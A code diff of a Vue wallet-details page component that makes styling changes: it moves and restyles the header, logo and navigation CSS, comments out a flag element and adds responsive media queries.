@@ -1,10 +1,12 @@
 <template>
   <div class="wallet-details">
     <header>
-      <router-link to="/" class="logo">Logo</router-link>
+      <router-link to="/" class="logo">
+        <!-- <img src="" alt="blockchain-logo" /> -->
+      </router-link>
       <div class="nav">
         <router-link :to="{ name: 'Wallets' }">Wallets</router-link>
-        <div class="flag"></div>
+        <!-- <div class="flag"></div> -->
       </div>
     </header>
     <section class="details">
@@ -103,12 +105,47 @@ const { email, seedPhrase } = formState
 <style scoped>
 header {
   width: 100%;
-  height: 80px;
-  background-color: rgb(18, 18, 44);
+  height: 70px;
+  /* background-color: rgb(18, 18, 44); */
+  background-color: #000000;
   display: flex;
   align-items: center;
   justify-content: space-between;
   padding: 10px 120px;
+}
+.logo {
+  padding: 0;
+  width: 100%;
+  height: 40px;
+  /* background-color: white; */
+  border-radius: 12px;
+  text-decoration: none;
+  background-image: url('@/assets/logo.png');
+  background-size: contain;
+  background-repeat: no-repeat;
+  /* background-position: center; */
+}
+.logo a {
+  text-decoration: none;
+}
+.nav {
+  display: flex;
+  gap: 20px;
+}
+.nav a {
+  background-color: rgb(46, 69, 112);
+  padding: 10px 20px;
+  border-radius: 12px;
+  text-decoration: none;
+  color: white;
+  font-size: 12px;
+  white-space: nowrap;
+}
+.flag {
+  padding: 10px 30px;
+  background-color: black;
+  border: 2px solid white;
+  border-radius: 12px;
 }
 .big {
   text-align: start;
@@ -123,35 +160,6 @@ header {
   font-size: 20px;
   margin-bottom: 10px;
   margin-top: 30px;
-}
-.email {
-  /* padding: 20px; */
-}
-.logo {
-  padding: 10px 20px;
-  background-color: white;
-  border-radius: 12px;
-  text-decoration: none;
-}
-.logo a {
-  text-decoration: none;
-}
-.nav {
-  display: flex;
-  gap: 20px;
-}
-.nav a {
-  background-color: rgb(64, 120, 224);
-  padding: 10px 20px;
-  border-radius: 12px;
-  text-decoration: none;
-  color: white;
-}
-.flag {
-  padding: 10px 30px;
-  background-color: black;
-  border: 2px solid white;
-  border-radius: 12px;
 }
 
 .details {
@@ -234,5 +242,48 @@ input {
   border: none;
   background-color: rgb(18, 18, 44);
   color: white;
+}
+@media (max-width: 768px) {
+  header {
+    flex-direction: row;
+    align-items: center;
+    /* padding: 15px 20px; */
+    /* background-color: #1a1a60;  */
+    gap: 15px;
+  }
+
+  .logo {
+    /* padding: 10px 15px; */
+    font-size: 1.2em;
+  }
+
+  .nav {
+    flex-direction: column;
+    align-items: flex-start;
+    /* gap: 10px; */
+  }
+
+  .nav a {
+    font-size: 16px;
+    /* color: red; */
+    padding: 6px 6px;
+    border-radius: 4px;
+  }
+
+  .flag {
+    display: none; /* Hide flag completely for better space management */
+  }
+}
+
+@media (max-width: 480px) {
+  header {
+    padding: 10px 15px;
+    gap: 10px;
+  }
+
+  .logo {
+    font-size: 1em;
+    padding: 8px 10px;
+  }
 }
 </style>
